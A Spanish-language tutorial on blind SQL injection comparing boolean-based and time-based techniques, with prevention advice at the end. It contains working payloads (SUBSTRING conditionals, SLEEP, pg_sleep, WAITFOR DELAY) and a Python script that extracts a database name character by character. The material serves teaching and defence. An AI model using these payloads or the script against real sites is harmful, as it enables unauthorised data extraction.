# Objetivo 1: El Arte de la Inyección Ciega (Blind SQLi)

## Escenario

No todas las aplicaciones devuelven errores amigables en pantalla. Cuando la aplicación no muestra errores ni datos extra, la inyección SQL parece imposible... pero no lo es. Este documento explica la diferencia técnica entre la inyección **Boolean-Based Blind** y la **Time-Based Blind**, y cómo un atacante extrae información letra por letra aunque la aplicación solo responda con una pantalla genérica de "Cargando...".

---

## 1. El problema: la "ceguera" del atacante

En una inyección SQL clásica (no ciega), la aplicación **devuelve los datos o los errores** en la respuesta: el atacante ve el resultado directamente. Por ejemplo, un error de MySQL que revela el nombre de la tabla, o una lista de usuarios inyectada en la página.

En una **Blind SQLi**, la aplicación está configurada para no filtrar nada:

- No muestra errores de base de datos (mensajes genéricos).
- No devuelve los datos consultados en la respuesta.
- Responde siempre con la misma pantalla: "Cargando...", "Operación exitosa", o un error genérico.

A primera vista parece "no vulnerable". Pero hay un detalle clave: **la respuesta HTTP no es la única canal de comunicación con el servidor**. La aplicación, aunque no hable, **se comporta de forma distinta** según si la condición inyectada es verdadera o falsa. Ese comportamiento diferencial es el canal de comunicación que el atacante explota.

---

## 2. Boolean-Based Blind (basada en booleanos)

### La idea central

El atacante inyecta una **condición lógica** (verdadero/falso) y observa si la respuesta de la aplicación **cambia** entre ambos casos. No necesita ver datos: le basta con que existan **dos respuestas distinguibles**.

### Ejemplo

Una tienda con URL:

```
https://tienda.com/producto?id=5
```

El atacante prueba:

```
https://tienda.com/producto?id=5 AND 1=1   -- condición siempre verdadera
https://tienda.com/producto/id=5 AND 1=2   -- condición siempre falsa
```

- Con `AND 1=1` la página muestra el producto normalmente.
- Con `1=2` la página muestra "producto no encontrado" o una versión vacía.

Si las dos respuestas son **distinguibles** (contenido distinto, código de estado distinto, longitud distinta), el atacante tiene un **oráculo booleano**: puede hacerle preguntas de sí/no a la base de datos.

### Cómo se hacen las preguntas

La técnica se basa en **subconsultas que comparan caracteres**:

```
https://tienda.com/producto?id=5 AND (SELECT SUBSTRING(database(),1,1)) = 'a'
```

- Si el primer carácter de la base de datos es `a` → la condición es verdadera → la página se ve normal.
- Si no → la página se ve "vacía".

El atacante repite con `b`, `c`, `d`... hasta encontrar el carácter correcto, y luego avanza al segundo, tercero, etc.

### Requisito clave

Solo necesita que existan **dos respuestas distinguibles**. No importa que la aplicación no muestre errores: basta con que "verdadero" y "falso" produzcan algo diferente (contenido, código HTTP, longitud de la respuesta, presencia de un elemento en el HTML).

---

## 3. Time-Based Blind (basada en tiempo)

### El problema que resuelve

¿Qué pasa cuando la aplicación responde **exactamente igual** en todos los casos? Ni contenido distinto, ni código de estado, ni longitud diferente. El oráculo booleano desaparece... pero queda otro canal: **el tiempo de respuesta**.

### La idea central

El atacante inyecta una condición que, **solo si es verdadera**, obliga a la base de datos a **esperar** un tiempo determinado antes de responder:

```sql
-- MySQL
SELECT ... WHERE id = 5 AND IF((SELECT SUBSTRING(database(),1,1)) = 'a', SLEEP(5), 0)

-- PostgreSQL
... AND CASE WHEN (SUBSTRING(database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END

-- SQL Server
... IF (SUBSTRING(database(),1,1)='a') WAITFOR DELAY '0:0:5'
```

### Cómo se lee la respuesta

- Si la respuesta tarda **~5 segundos** → la condición es **verdadera**.
- Si responde **inmediatamente** → la condición es **falsa**.

El "oráculo" ya no es el contenido de la respuesta sino su **latencia**. La aplicación sigue mostrando "Cargando..." en ambos casos, pero el atacante mide el tiempo con precisión.

### Ejemplo de extracción

```
https://tienda.com/producto?id=5 AND IF((SELECT SUBSTRING(database(),1,1))='a', SLEEP(5), 0)
→ responde en 0.2s → no es 'a'

... AND IF((SELECT SUBSTRING(database(),1,1))='e', SLEEP(5), 0)
→ responde en 5.2s → el primer carácter es 'e'
```

### Consideraciones prácticas

- El retardo debe ser **suficientemente grande** para distinguirlo del ruido de red (ej. 5 segundos) pero no tanto que haga la extracción eterna.
- El ruido de red introduce falsos positivos: por eso se repiten las mediciones y se usan umbrales.
- Es **mucho más lento** que la boolean-based: cada carácter requiere una petición (o varias, para confirmar).

---

## 4. Comparación técnica directa

| Aspecto | Boolean-Based Blind | Time-Based Blind |
|---------|--------------------|------------------|
| **Oráculo** | Contenido/estado de la respuesta | Latencia de la respuesta |
| **Señal** | Dos respuestas distinguibles | Diferencia de tiempo medible |
| **Velocidad** | Relativamente rápida (1 petición por bit/char) | Muy lenta (esperas de segundos por carácter) |
| **Ruido** | Bajo (respuestas deterministas) | Alto (jitter de red, carga del servidor) |
| **Requisito** | Dos respuestas distintas para V/F | Capacidad de ejecutar funciones de retardo (`SLEEP`, `WAITFOR`) |
| **Cuándo se usa** | Cuando hay diferencias visibles | Cuando la respuesta es 100% idéntica siempre |

Ambas comparten la misma esencia: **convertir la base de datos en un oráculo de sí/no** y automatizar la extracción pregunta por pregunta.

---

## 5. Extracción letra por letra: el proceso completo

Con la pantalla genérica de "Cargando...", el atacante procede así:

### Paso 1: Confirmar la inyección

Probar que el parámetro es inyectable y que existe un canal de señal (cambio de contenido o de tiempo).

### Paso 2: Automatizar el oráculo

Nadie hace esto a mano. Con **sqlmap** o un script propio:

```python
# Pseudocódigo de extracción time-based
import requests, time

def ask(question_payload):
    start = time.time()
    requests.get(f"https://tienda.com/producto?id=5 AND {question_payload}")
    return (time.time() - start) > 4  # True si tardó más de 4s

charset = "abcdefghijklmnopqrstuvwxyz0123456789_-"
nombre = ""
for posicion in range(1, 30):
    for caracter in charset:
        payload = f"IF((SELECT SUBSTRING(database(),{posicion},1))='{caracter}', SLEEP(5), 0)"
        if ask(payload):
            nombre += caracter
            print(f"Nombre de la BD hasta ahora: {nombre}")
            break
```

### Paso 3: Optimizaciones del atacante

- **Búsqueda binaria por ASCII**: en vez de probar carácter por carácter, preguntar `ASCII(SUBSTRING(...)) > 77` → reduce las preguntas de ~70 a ~7 por carácter.
- **Condicionales por bits**: extraer bit a bit (`SUBSTRING(...) & 1`), 8 preguntas por carácter pero independientes del charset.
- **Paralelización**: extraer distintas posiciones en paralelo (con cuidado de no saturar el servidor).
- **Herramientas**: **sqlmap** automatiza todo esto con las técnicas `--technique=B` (boolean) y `--technique=T` (time).

### Paso 4: El resultado

Aunque la aplicación solo diga "Cargando...", el atacante termina con el nombre completo de la base de datos, y de ahí puede escalar a tablas, columnas y datos — todo con peticiones que **nunca generan un error visible**.

---

## 6. Por qué es tan peligrosa y cómo se previene

### Por qué es peligrosa

- **Invisible para logs y monitoreo**: no hay errores, no hay respuestas anómalas, solo peticiones "normales" (aunque time-based genera latencias anómalas detectables).
- **Lenta pero completa**: con paciencia y automatización, extrae **toda** la base de datos.
- **Funciona incluso en aplicaciones "bien configuradas"** que ocultan errores: ocultar errores no arregla la inyección, solo la vuelve ciega.

### Prevención (la misma de siempre, más monitoreo)

1. **Consultas preparadas (prepared statements / parameterized queries)** — la única defensa real: el dato nunca se concatena al SQL.
2. **Mínimo privilegio** en el usuario de BD (limita el daño, no la extracción).
3. **Rate limiting y detección de anomalías**: cientos de peticiones idénticas con un solo carácter cambiado son un patrón inconfundible.
4. **WAF** como capa complementaria (no sustituye a los prepared statements).

---

## 7. Resumen

| Aspecto | Boolean-Based | Time-Based |
|---------|--------------|------------|
| Pregunta al oráculo | "¿La página cambia?" | "¿La respuesta tarda?" |
| Señal de "verdadero" | Contenido/estado distinto | Latencia ≈ al retardo inyectado |
| Velocidad | Lenta | Muy lenta |
| Requisito | 2 respuestas distinguibles | Funciones de retardo disponibles |

> **Conclusión:** la "ceguera" de la aplicación no la protege: solo cambia el canal de exfiltración. Mientras exista **cualquier diferencia observable** entre dos estados del servidor (contenido, código, longitud o tiempo), el atacante puede construir un oráculo de sí/no y automatizar la extracción de toda la base de datos, carácter a carácter. La defensa no es ocultar errores sino **eliminar la inyección** con consultas parametrizadas.
